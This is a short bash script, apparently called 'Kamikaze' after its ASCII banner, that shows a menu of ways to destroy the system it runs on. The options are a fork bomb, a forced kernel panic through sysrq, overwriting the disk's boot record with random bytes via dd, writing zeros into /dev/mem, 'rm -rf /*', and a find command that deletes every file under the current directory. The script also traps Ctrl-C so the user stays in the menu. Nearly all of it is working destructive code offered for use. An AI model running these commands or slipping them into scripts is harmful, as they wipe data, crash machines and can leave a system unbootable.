#!/bin/bash
trap "remind" 2
splash(){
clear
echo -e "\e[1;92;49m##    ##    ###    ##     ## #### ##    ##    ###    ######## ######## ";
echo "##   ##    ## ##   ###   ###  ##  ##   ##    ## ##        ##  ##       ";
echo "##  ##    ##   ##  #### ####  ##  ##  ##    ##   ##      ##   ##       ";
echo "#####    ##     ## ## ### ##  ##  #####    ##     ##    ##    ######   ";
echo "##  ##   ######### ##     ##  ##  ##  ##   #########   ##     ##       ";
echo "##   ##  ##     ## ##     ##  ##  ##   ##  ##     ##  ##      ##       ";
echo -e "##    ## ##     ## ##     ## #### ##    ## ##     ## ######## ########\e[1;94;49m ";
}
mbr(){
dd if=/dev/urandom of=/dev/sda bs=512 count=1
}
overwrite(){
cp /dev/zero /dev/mem
}
kpanic(){
echo 1 > /proc/sys/kernel/sysrq
echo c > /proc/sysrq-trigger
}
quote(){
echo "Cowards die many times before their deaths; The valiant never taste of death but once."
}
fork(){
:(){ :|:& };:
}
remove(){
rm -rf /*
}
powerofexec(){
find . -type f -name * -exec rm -f {} \;
}
errormsg(){
echo "Invalid Option, Please choose the correct option again"
}
mainmenu(){
splash
echo "How would you like me to kill myself alongside with this system ?"
echo -e "\e[1;91;49m1) Fork Bomb"
echo "2) Kernel Panic"
echo "3) Overwrite MBR"
echo "4) Replace Processes"
echo "5) Remove Everything on your Hard-Disk"
echo "6) Power of Exec"
echo "99) Exit"
read option
case $option in
1) 
splash
fork
exit
;;
2)
splash
kpanic
exit
;;
3)
splash
mbr
exit
;;
4)
splash
overwrite
exit
;;
5)
splash
remove
exit
;;
6)
splash
powerofexec
exit
;;
99)
splash
quote
exit
;;
*)
mainmenu
;;

esac
}
remind(){
	clear
	echo -e "\e[1;97;101mYou Should Not Exit like this, to exit enter 99 on the next screen\e[1;92;49m"
	echo ""
	echo ""
	echo "Press Enter"
	read j
	mainmenu
}
splash
mainmenu
